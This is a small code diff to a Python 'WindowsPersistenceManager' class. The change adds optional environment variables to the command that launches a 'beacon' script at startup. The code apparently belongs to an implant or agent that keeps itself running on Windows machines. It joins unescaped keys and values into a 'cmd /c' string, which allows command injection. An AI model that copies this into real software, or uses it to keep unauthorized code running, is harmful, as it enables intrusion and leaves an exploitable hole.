@@ -66,7 +66,14 @@ class WindowsPersistenceManager(BasePersistenceManager):
         beacon_path = f'"{self.beacon_path}"'
         config_path = f'"{self.config_path}"'
 
-        return f'{python_path} {beacon_path} --config {config_path}'
+        command = f'{python_path} {beacon_path} --config {config_path}'
+        if self.extra_env:
+            env_prefix = " && ".join(
+                f'set "{key}={value}"'
+                for key, value in self.extra_env.items()
+            )
+            command = f'cmd /c "{env_prefix} && {command}"'
+        return command
 
     def install(self) -> PersistenceResult:
         # Check if we need admin and don't have it
